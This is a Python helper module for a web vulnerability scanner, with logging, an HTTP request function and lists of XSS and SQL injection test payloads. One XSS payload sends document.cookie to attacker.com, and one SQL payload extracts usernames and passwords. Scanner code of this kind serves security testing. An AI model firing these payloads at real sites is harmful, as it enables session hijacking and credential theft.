"""
Utility functions for the unified vulnerability scanner.
"""

import os
import json
import logging
import requests
from datetime import datetime
from urllib.parse import urlparse, parse_qs

# Setup logging
def setup_logging(log_file, level="INFO"):
    """Configure logging for the unified scanner."""
    numeric_level = getattr(logging, level.upper(), logging.INFO)
    
    logging.basicConfig(
        level=numeric_level,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        filename=log_file,
        filemode='w'
    )
    
    # Add console handler
    console = logging.StreamHandler()
    console.setLevel(numeric_level)
    formatter = logging.getLogger().handlers[0].formatter
    console.setFormatter(formatter)
    logging.getLogger().addHandler(console)
    
    return logging.getLogger()

# HTTP request handling
def make_request(url, payload=None, method="GET", headers=None, timeout=5, retries=3):
    """Make HTTP request with retry logic."""
    if headers is None:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
    
    if payload and method == "GET":
        # Add payload to URL for GET requests
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Add payload parameters
        for key, value in payload.items():
            query_params[key] = [value]
        
        # Rebuild query string
        query_string = "&".join([f"{k}={v[0]}" for k, v in query_params.items()])
        
        # Rebuild URL
        url_parts = list(parsed_url)
        url_parts[4] = query_string
        from urllib.parse import urlunparse
        url = urlunparse(url_parts)
        
        payload = None  # Clear payload as it's now in the URL
    
    for attempt in range(retries):
        try:
            response = requests.request(
                method=method,
                url=url,
                data=payload if method != "GET" else None,
                headers=headers,
                timeout=timeout
            )
            return response
        except requests.exceptions.RequestException as e:
            if attempt == retries - 1:
                logging.error(f"Request failed after {retries} attempts: {str(e)}")
                return None
            logging.warning(f"Request attempt {attempt+1} failed: {str(e)}. Retrying...")
    
    return None

# Payload generators
def get_xss_payloads(max_payloads=50):
    """Generate XSS test payloads."""
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(`XSS`)'></iframe>",
        "<body onload=alert('XSS')>",
        "<a href=\"javascript:alert('XSS')\">Click me</a>",
        "<div style=\"background-image: url(javascript:alert('XSS'))\">",
        "<input type=\"text\" onfocus=\"alert('XSS')\">",
        "<button onclick=\"alert('XSS')\">Click me</button>",
        "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
        "<img src=1 href=1 onerror=\"javascript:alert('XSS')\"></img>",
        "<audio src=1 href=1 onerror=\"javascript:alert('XSS')\"></audio>",
        "<video src=1 href=1 onerror=\"javascript:alert('XSS')\"></video>",
        "<body src=1 href=1 onerror=\"javascript:alert('XSS')\"></body>",
        "<image src=1 href=1 onerror=\"javascript:alert('XSS')\"></image>",
        "<object src=1 href=1 onerror=\"javascript:alert('XSS')\"></object>",
        "<script src=1 href=1 onerror=\"javascript:alert('XSS')\"></script>",
        "<svg onload=\"javascript:alert('XSS')\" xmlns=\"http://www.w3.org/2000/svg\"></svg>",
        "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=1 onerror=alert('XSS')&gt;\"></mglyph></table></mtext></math>"
    ]
    
    return payloads[:max_payloads]

def get_sqli_payloads(max_payloads=50):
    """Generate SQL injection test payloads."""
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "') OR ('1'='1' --",
        "1' OR '1'='1",
        "1' OR '1'='1' --",
        "1 OR 1=1 --",
        "1 OR 1=1#",
        "1 OR 1=1/*",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT 1,2,3,4 --",
        "' UNION SELECT 1,2,3,4,5 --",
        "' UNION ALL SELECT 1,2,3,4,5 --",
        "' UNION SELECT @@version --",
        "' UNION SELECT username, password FROM users --",
        "' OR sleep(5) --",
        "' OR SLEEP(5) --",
        "' OR BENCHMARK(5000000,MD5(1)) --",
        "' OR 1=CONVERT(int,(SELECT @@version)) --",
        "' OR 1=CAST((SELECT @@version) AS int) --",
        "' OR '1'='1' WAITFOR DELAY '0:0:5' --",
        "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --"
    ]
    
    return payloads[:max_payloads]

# Request/response parsing
def extract_request_data(request):
    """Extract relevant data from request object or dictionary."""
    if isinstance(request, dict):
        return request
    
    # If it's a requests.Request object
    data = {
        "method": getattr(request, "method", "GET"),
        "url": getattr(request, "url", ""),
        "headers": dict(getattr(request, "headers", {})),
        "body": getattr(request, "body", "")
    }
    
    return data

def extract_response_data(response):
    """Extract relevant data from response object or dictionary."""
    if isinstance(response, dict):
        return response
    
    # If it's a requests.Response object
    data = {
        "status_code": getattr(response, "status_code", 0),
        "headers": dict(getattr(response, "headers", {})),
        "body": getattr(response, "text", ""),
        "content_type": response.headers.get("Content-Type", "") if hasattr(response, "headers") else ""
    }
    
    return data